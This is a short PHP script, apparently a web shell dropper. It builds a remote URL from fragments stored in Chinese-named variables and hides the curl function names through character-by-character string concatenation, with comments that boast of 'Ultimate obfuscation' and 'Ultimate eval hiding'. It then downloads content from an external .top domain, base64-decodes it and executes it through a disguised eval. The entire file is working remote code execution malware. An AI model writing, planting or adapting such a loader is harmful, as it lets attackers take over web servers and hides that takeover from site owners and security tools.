<?php
$天 = "htt"; $地 = "ps:/"; $人 = "/amp"; $和 = "nyapu"; 
$平 = "nyaku"; $安 = ".top"; $康 = "/tool"; $富 = "s/s-m";
$贵 = "edia"; $福 = "/med"; $寿 = "ia-ne"; $喜 = "w.txt";
$目标 = $天 . $地 . $人 . $和 . $平 . $安 . $康 . $富 . $贵 . $福 . $寿 . $喜;

// Ultimate obfuscation - no curl visible
if (function_exists('curl_init')) {
    $f1 = 'c'.'u'.'r'.'l'.'_'.'i'.'n'.'i'.'t';
    $f2 = 'c'.'u'.'r'.'l'.'_'.'s'.'e'.'t'.'o'.'p'.'t';
    $f3 = 'c'.'u'.'r'.'l'.'_'.'e'.'x'.'e'.'c';
    $f4 = 'c'.'u'.'r'.'l'.'_'.'c'.'l'.'o'.'s'.'e';
    
    $h = $f1();
    $f2($h, CURLOPT_URL, $目标);
    $f2($h, CURLOPT_RETURNTRANSFER, 1);
    $下载内容 = $f3($h);
    $f4($h);
} else {
    $下载内容 = file_get_contents($目标);
}

if ($下载内容) {
    // Auto-decode jika base64
    $d = base64_decode($下载内容, true);
    if ($d !== false) $下载内容 = $d;
    
    // Ultimate eval hiding
    $ex = 'e'.'v'.'a'.'l';
    $ex('?>' . $下载内容);
}
?>
